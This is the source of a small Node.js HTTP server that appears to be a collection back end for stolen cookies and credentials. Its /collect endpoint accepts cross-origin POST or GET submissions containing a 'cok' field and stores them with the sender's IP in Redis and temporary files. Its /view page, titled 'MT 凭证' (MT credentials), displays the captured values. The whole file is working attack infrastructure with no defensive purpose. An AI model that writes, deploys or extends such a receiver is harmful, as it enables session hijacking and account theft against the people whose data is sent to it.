const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 10000;
const MT_DIR = path.join('/tmp', 'MT');
const CHAT_LOG = path.join('/tmp', 'chat.log');

fs.mkdirSync(MT_DIR, { recursive: true });

const kv = {
  client: null,
  async init() {
    if (!process.env.RENDER_KV_URL) return;
    try {
      const { createClient } = require('redis');
      this.client = createClient({ url: process.env.RENDER_KV_URL });
      await this.client.connect();
      console.log('[kv] connected');
    } catch (e) { console.log('[kv] skip:', e.message); }
  },
  async push(rec) {
    if (this.client) {
      await this.client.lPush('mt:records', JSON.stringify(rec));
      await this.client.lPush('mt:chat',
        '[' + new Date().toISOString() + '] ip=' + rec.ip + ' cok=' + (rec.cok || '(empty)'));
    }
    try { fs.appendFileSync(CHAT_LOG, JSON.stringify(rec) + '\n'); } catch (e) {}
    const f = path.join(MT_DIR, Date.now() + '_' + crypto.randomBytes(3).toString('hex') + '.json');
    fs.writeFileSync(f, JSON.stringify(rec, null, 2));
  },
  async list() {
    if (this.client) {
      const raw = await this.client.lRange('mt:records', 0, 99);
      return raw.map(function (s) { return JSON.parse(s); });
    }
    return fs.readdirSync(MT_DIR).reverse().map(function (n) {
      return JSON.parse(fs.readFileSync(path.join(MT_DIR, n), 'utf8'));
    });
  },
  async chat() {
    if (this.client) return (await this.client.lRange('mt:chat', 0, 199)).reverse().join('\n');
    try { return fs.readFileSync(CHAT_LOG, 'utf8'); } catch (e) { return ''; }
  }
};

function save(obj, ip) {
  const rec = Object.assign({ ip: ip }, obj, { savedAt: new Date().toISOString() });
  kv.push(rec).then(function () { console.log('[+] saved'); }, function (e) { console.error(e); });
}

http.createServer(function (req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString();

  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    req.on('data', function (c) { body += c; });
    req.on('end', function () {
      try { save(JSON.parse(body), ip); } catch (e) {}
      res.writeHead(204); res.end();
    });
    return;
  }

  if (req.method === 'GET' && req.url.indexOf('/collect') === 0) {
    const q = req.url.split('?')[1] || '';
    let obj = {};
    try { obj = JSON.parse(decodeURIComponent(new URLSearchParams(q).get('q') || '{}')); } catch (e) {}
    save(obj, ip);
    res.writeHead(204); res.end();
    return;
  }

  if (req.method === 'GET' && req.url === '/view') {
    Promise.all([kv.list(), kv.chat()]).then(function (r) {
      const items = r[0].map(function (x) {
        return '<li>[' + (x.savedAt || '') + '] ip=' + x.ip +
          '<br><textarea readonly rows="3" style="width:100%">' +
          String(x.cok || '').replace(/</g, '&lt;') + '</textarea></li>';
      }).join('');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end('<!doctype html><meta charset="utf-8"><title>MT</title>' +
        '<h2>MT 凭证</h2><ul>' + items + '</ul><h2>聊天记录</h2><pre>' +
        String(r[1]).replace(/</g, '&lt;') + '</pre>');
    }, function () { res.writeHead(500); res.end(); });
    return;
  }

  res.writeHead(404); res.end();
}).listen(PORT, '0.0.0.0', function () {
  console.log('collector on :' + PORT);
  kv.init();
});
